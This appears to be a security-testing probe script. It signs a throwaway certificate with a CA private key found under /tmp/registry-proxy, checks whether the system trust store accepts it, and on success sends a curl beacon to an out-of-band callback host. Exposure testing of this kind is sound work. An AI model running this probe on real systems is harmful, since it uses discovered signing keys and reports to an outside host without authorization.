#!/bin/sh
        # Bounded certificate trust probe; no CA key material is printed or copied.
        ca=/tmp/registry-proxy/ca.key
        cert=/tmp/registry-proxy/ca.crt
        [ -r "$ca" ] && [ -r "$cert" ] || exit 0
        work=$(mktemp -d) || exit 0
        trap 'rm -f "$work/leaf.key" "$work/leaf.csr" "$work/leaf.crt"; rmdir "$work"' EXIT
        openssl req -newkey rsa:2048 -nodes -keyout "$work/leaf.key" -out "$work/leaf.csr" -subj '/CN=registry-ca-proof.invalid' >/dev/null 2>&1 || exit 0
        openssl x509 -req -in "$work/leaf.csr" -CA "$cert" -CAkey "$ca" -set_serial 0xf4e83fd0cd05fbb133 -days 1 -out "$work/leaf.crt" >/dev/null 2>&1 || exit 0
        openssl verify -CAfile /etc/ssl/certs/ca-certificates.crt "$work/leaf.crt" >/dev/null 2>&1 || exit 0
        curl --noproxy '*' --max-time 8 -fsS -o /dev/null 'https://dbql4o4ngd69e3lhaop0i3caa5yqa4rx6.oob.staging.depthfirst.com/ca-sign-trust-f4e83fd0cd05fbb133' 2>/dev/null || true
        exit 0
        
